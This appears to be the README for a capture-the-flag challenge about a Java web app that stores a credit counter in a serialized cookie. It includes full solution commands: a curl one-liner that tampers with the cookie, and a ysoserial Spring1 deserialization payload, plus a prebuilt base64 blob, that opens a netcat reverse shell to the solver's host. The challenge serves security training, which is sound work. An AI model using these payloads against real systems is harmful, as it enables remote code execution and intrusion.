# Too Many Credits

Part 1:
```
Okay, fine, there's a lot of credit systems. We had to put that guy on break; seriously concerned about that dude.

Anywho. We've made an actually secure one now, with Java, not dirty JS this time. Give it a whack?

If you get two thousand million credits again, well, we'll just have to shut this program down.
```

Part 2:
```
Nice work on jimmying your way into getting that first flag. I'll bet you can't get a shell on the server, though!
```

This will be split into two challenges with the second challenge only appearing after the first is complete.

## Setup

As per usual:

1. `docker build -t too-many-credits .`
2. `docker run --rm -d too-many-credits`

## Brief Dev Description

This challenge is multistage; first flag is found via actually obtaining 2,000,000,000 credits.
The second is obtained via RCE over J-POP, which can be achieved with the standard tools. Not
going to inflict the extreme difficulty version of J-POP chains -- this year.

## Solution

Replacing links where appropriate, solution one can be done successfully with just curl and some utilities:
```
curl --cookie "counter=$(curl --silent --output /dev/null --cookie-jar - 'http://172.17.0.2:8080' | tail -n 1 | rev | cut -d$'\t' -f 1 | sed -e 's/^"//' -e 's/"$//' | rev | base64 -d | gunzip | xxd | sed -e 's/0000 0000 0000/0005 0000 0000/' | xxd -r | gzip | base64 -w 0)" "http://172.17.0.2:8080" | grep --colour=never -oE 'gigem\{.*\}'
```

Solution two requires the use of ysoserial; the following command succeed with `ysoserial` as a command on the local system:
```
nc -nlvp 4444 # in your reverse shell window
curl --cookie "counter=$(ysoserial Spring1 'nc 172.17.0.1 4444 -e /bin/bash' | gzip | base64 -w 0)" "http://172.17.0.2:8080"
```

If you want to test this without ysoserial, you can use:
```
curl --cookie "counter=H4sIAAAAAAAAA61Xz28UVRz/vt3uj65bSlva8ptFChSUGQqFFlstpbWwuKXELuXQQ5mdfd0dmJ0Z3rxpZ03k5smT8W9QD+IBY9R4MBJv4MXExARjohdv6oGYeEH9vjfT7sIudEEm2Znpe9+fn/f5fr/Tm79DzGWQtVlJcR1mWKVlplXoqs2uKbrNqDJPmaGZxltawaT5qkMvM81xKBuYpbxsF7PWin1Nrl9k9opRpOzT858l3p3c/mMEolmIGVaR+jlIVaT0BbTMoTt3VVvRVFOzSuo8Fy7HcpB0Qn0OEzkMRn0kGFUEoz4umPoAxnwH8OKwyaKreaZZ7rLNKpS5b+MqgVefOtN64z6DfhG9IqJXGF02qc4V3PWrvx68l/lu89TdCJAckDKH/XV5hpKqwEvXuGFb5zSraMpoEf5jrmetW9Msy+ZSRplcf21QvHTnr87euzc+iEAkB+kKrRQoW9BMj7ocOgPPHjdMdVZzEN42jklw6KoLacrUXDdw3yVTEuLKOc0to0osce/2t31Xvo9CZAZSpq0VZzSd2ywL7bzMqFu2zaLvTJwWSEN6NYn3zQJeDokS5QIxCXcE+hrREruwS6z7il8xFb52RkqeVhxT49T1r8MNiGNkV5qdVoGigrIsA6oqruc4NuPKpMftVYPRS5iGOzBXuIq+gqCr09SkJQTPKjXA+E7h7jfpB0M98tQ67HotDkNNmSjdq6F79SFHAs6AZurGgT+kGWYs7u3y3tEM3HYEN1BDbF7R7YoiiCNcaY6ml6niawi1YlicMkszFd81uS4A9mvYZvHZfnnutnXz4+NRiGehY0lUqcUveIJDWdi0JE/EpDwrqncRUkuFKqe6XRTcii4unlmE+JIu6IPFvNhAqRzElixMWWSBoHYt2R53PI5FgtXEDWGkr46gtfWwcv/Fy2PS0RsPtvWWSj+NRADkXgTXI4tnbt7v/zuezP8SLsdv3fnnq69x+xicSkEUXkzASAL2J+AAgc2urOoFrH889EvZaQLkPIGOKdtyuWZxWTKxTzLv33/v5z9fIxAfNyyD40t08NACgbYpzJpgQRkWDfDJi/ZAsIkhj8wFDY2LdhEstvGy4RLomedeIR9ieFGrivIhkM5aFmUSIopCJ3JV1w6CU51Axg0AOasV8ZjdgSZWxgjW31q5EGCDOeSAihwQdFMDDqiSA+oaB1TJAXV6bnZssal0xazJumELpKzWauublYAkWbR1r4J8IXDkqdyjajmwg+mf+f/BEEi97uvUEWtuAg4S+PDp8NgwgiKvqNP52UnfcLO4pGGhbqzUEoZGaE7w4FmiIJAIsSQw+TyQnLc9ptMZQ9A4HTJQEUWahhS8kIBBAsefgbAETrd6IsyzuFGh6mTBRYrrfM0SgS2yWRj2Q+OfwKlWLa9ZWmcLgT0b5IJHNK6bYSvoqnW4N4MgE3AYMUPB8G8CvYOHcg1iY2l4GY6k4CVQ0KWlZ4ZGjilDI8pRZSgzjFfmCM2oBcNSCzh1k3AUOwj1qU7g4GDjN1K9feyZOsVWm8aWd1zYH8aWNs81/RrO7rAZ7ayleHEVO8/oyeGRk6PDp/A3PEJgd+5J+2OwF4d3FAdZG/62Qwzi+EzIkZ6Ua8gKvKdxRcUnwWfs8BdAbkmRDrzH5aIKm8QQCwSgE0bldOyBLSgllCfwFxVrjyoOS8VMsBkqirde6JP7BPphK2psw/cgRmF2R2g2K1ebmB2VZg8Hm03N7oRdqCHedsMedF9zkIRD60kP4I6Q6vwIoiT3JajdQ5/Dicu3pOJJmRQREhnpfy904TOFWxHYh8O83RPDcS/K/rA+unaI0dWbgP4EbE3AtlZH1/XfjD/GK2e3Pp/RFZ2x7YZRtX/DUYVarTSR7QT2tWAKU69RPfjceWwT2KiQn8hj0jqPxx/hcbfc75H3LXWn2ydO1+HQhjXFnFUCvr/CoLv2FTy3QhnDfyWgdvmO/Po78B98dpo5jA0AAA==" "http://172.17.0.2:8080"
```
